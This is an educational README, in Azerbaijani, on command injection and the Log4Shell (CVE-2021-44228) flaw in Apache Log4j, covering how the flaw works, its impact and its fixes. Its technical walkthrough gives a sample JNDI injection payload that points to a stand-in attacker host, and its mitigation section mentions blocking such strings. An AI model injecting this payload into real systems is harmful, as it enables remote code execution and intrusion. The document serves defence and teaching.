# Command Injection & Log4Shell (CVE-2021-44228) Təhlili

Bu README faylı, müasir kiber təhlükəsizlik tarixinin ən kritik zəifliklərindən biri olan **Log4Shell (CVE-2021-44228)** haqqında ətraflı məlumat, işləmə prinsipi və qorunma yollarını ehtiva edir.

---

## 📌 Mündəricat
- [Ümumi Baxış](#ümumi-baxış)
- [Command Injection Nədir?](#command-injection-nədir)
- [CVE-2021-44228 (Log4Shell) Nedir?](#cve-2021-44228-log4shell-nedir)
- [Zəiflik Necə İşləyir? (Texniki Analiz)](#zəiflik-necə-işləyir-texniki-analiz)
- [Təsir Sahəsi](#təsir-sahəsi)
- [Qorunma və Həll Yolları](#qorunma-və-həll-yolları)

---

## 🔍 Ümumi Baxış
**CVE-2021-44228**, Apache Log4j 2 kitabxanasında aşkar edilmiş kritik bir **RCE (Remote Code Execution)** yəni "Uzaqdan Kod İcra Etmə" zəifliyidir. CVSS balları üzrə maksimum **10.0** xalı ilə qiymətləndirilmişdir.

## 💻 Command Injection Nədir?
Command Injection (Əmr Inyeksiyası), hücumçunun zəifliyi olan bir tətbiq vasitəsilə ana əməliyyat sistemində (OS) istədiyi əmrləri icra etməsinə imkan verən hücum növüdür. 

Log4Shell vəziyyətində bu, birbaşa OS əmri deyil, JNDI (Java Naming and Directory Interface) vasitəsilə kənar bir serverdən zərərli Java klassının yüklənib icra edilməsi şəklində baş verir.



---

## ⚡ CVE-2021-44228 (Log4Shell) Nedir?
Log4j, Java proqramlaşdırma dilində yazılmış ən populyar loqlaşdırma (qeydiyyat) kitabxanasıdır. Zəiflik, kitabxananın "Lookups" adlı funksiyasından qaynaqlanır. Bu funksiya log mesajları içərisində xüsusi formatlı mətni (məsələn: `${date:...}`) dinamik dəyərlərlə əvəz etməyə imkan verir.

Lakin, Log4j-nin JNDI dəstəyi hücumçulara uzaqdakı bir LDAP serverinə sorğu göndərməyə şərait yaratmışdır.

---

## 🛠 Zəiflik Necə İşləyir? (Texniki Analiz)

Hücumun addımları aşağıdakı kimidir:

1. **Giriş (Input):** Hücumçu tətbiqin loqladığı bir sahəyə (məsələn: HTTP Header, User-Agent, Login forması) zərərli payload göndərir.
   - Örnək Payload: `${jndi:ldap://attacker.com/Exploit}`
2. **Loqlaşdırma:** Log4j bu mesajı qəbul edir və `${}` sintaksisini görərək onu "Lookup" etməyə çalışır.
3. **JNDI Sorğusu:** Tətbiq avtomatik olaraq `attacker.com` ünvanındakı LDAP serverinə sorğu göndərir.
4. **Payload İcrası:** Hücumçunun serveri tətbiqə zərərli bir Java `.class` faylı qaytarır. Java Runtime bu klassı yükləyir və daxilindəki kodu (məsələn, Reverse Shell) icra edir.



---

## 🌐 Təsir Sahəsi
Log4j demək olar ki, bütün böyük müəssisə proqramlarında istifadə edildiyi üçün təsiri qlobal olmuşdur:
- **Cloud Provayderlər:** AWS, Google Cloud, Microsoft Azure.
- **Tətbiqlər:** Minecraft, Steam, Apple iCloud.
- **Müəssisə Alətləri:** Elasticsearch, Kafka, VMware.

---

## 🛡 Qorunma və Həll Yolları

### 1. Yeniləmə (Ən Effektiv Yol)
Log4j versiyasını təcili olaraq təhlükəsiz versiyaya yeniləyin:
- Java 8 və daha yuxarı: **2.17.1** və ya daha yeni.
- Java 7: **2.12.4**
- Java 6: **2.3.2**

### 2. Sistem Parametrləri (Yeniləmə Mümkün Deyilsə)
Log4j 2.10 və yuxarı versiyalarda `log4j2.formatMsgNoLookups` parametrini `true` olaraq təyin edin:
```bash
java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
```

### 3. JndiLookup Klassını Silmək
Əgər yeniləmə imkanı yoxdursa, `zip` aləti ilə `log4j-core.jar` içindən zərərli klassı silə bilərsiniz:
```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### 4. Şəbəkə Səviyyəsində Qorunma
- Çıxış (Egress) trafikini məhdudlaşdırın. Serverlərinizin kənar LDAP/RMI serverlərinə sorğu göndərməsinin qarşısını alın.
- WAF (Web Application Firewall) qaydalarından istifadə edərək `${jndi:` tipli sorğuları bloklayın.

---

> **Xəbərdarlıq:** Bu məlumat yalnız təhsil və müdafiə məqsədləri üçün hazırlanmışdır. İcazəsiz sistemlərə hücum etmək qanunsuz və qeyri-etikdir.
